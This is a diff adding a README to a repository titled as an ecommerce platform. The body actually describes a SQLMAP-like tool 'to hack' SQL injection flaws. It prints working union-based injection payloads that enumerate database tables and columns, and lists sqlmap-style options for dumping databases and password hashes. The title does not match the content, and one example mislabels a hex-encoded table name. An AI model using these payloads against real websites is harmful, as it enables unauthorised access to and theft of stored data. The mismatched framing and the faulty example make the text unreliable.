@@ -1,0 +1,49 @@
+# Modern-Ecommerce-Platforms
+Design and Develop Modern Ecommerce Plafform
+
+# Project Idea
+
+Creating a tool similar to SQLMAP for web applications using HTML, PHP, HTTP requests, and SQL. It is used to hack and find SQL injection vulnerabilities by providing the URL and selecting the options, rather than writing them by hand, and checking the results at the end.
+
+# The normal hacking without using any tool be like that 
+
+?id=.1 union select 1,2,3,4,5,6,7,8,9,10,11,12 -- -
+# To get tables
+.1 union select 1,2,table_name,4,5,6,7,8,9,10,11,12 +From+Information_Schema.+tAblES+Where+table_ScHEmA=scHEMA() -- -
+
+# Result
+ categories,comments,posts,users,users_online
+
+
+# To get Columns inside table need to encrypt the table name EX: posts = 0x7573657273
+.1 union select 1,2,group_concat(column_name),4,5,6,7,8,9,10,11,12+froM+InfORmation_scHema.cOlumns WheRe+tAblE_naMe=0x7573657273 -- -
+
+# Options
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --passwords         Enumerate DBMS users password hashes
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table(s) to enumerate
+    -C COL              DBMS database table column(s) to enumerate
+
+
+# Codes Summary
+![Screenshot from 2023-10-04 15-57-10](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/6a6d2628-9255-4d57-916d-10542f22e07c)
+![Screenshot from 2023-10-04 15-57-17](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/befb462e-e1a6-4d59-be9f-80aa68dddfbc)
+![Screenshot from 2023-10-04 15-57-23](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/01c9cee4-c3e4-47e9-83e8-339fbb519958)
+![Screenshot from 2023-10-04 15-57-29](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/1b7c7ff4-d73d-4831-88f6-5ec835e3e127)
+![Screenshot from 2023-10-04 15-57-36](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/b30e5250-9d92-40f0-8dda-d8510a2c3e66)
+
+
+# Website
+![Screenshot from 2023-10-04 16-01-27](https://github.com/langsari/Modern-Ecommerce-Platforms/assets/134181494/fa7b3d4a-01ea-43de-9ec8-eb13fa74ec1a)
+
+
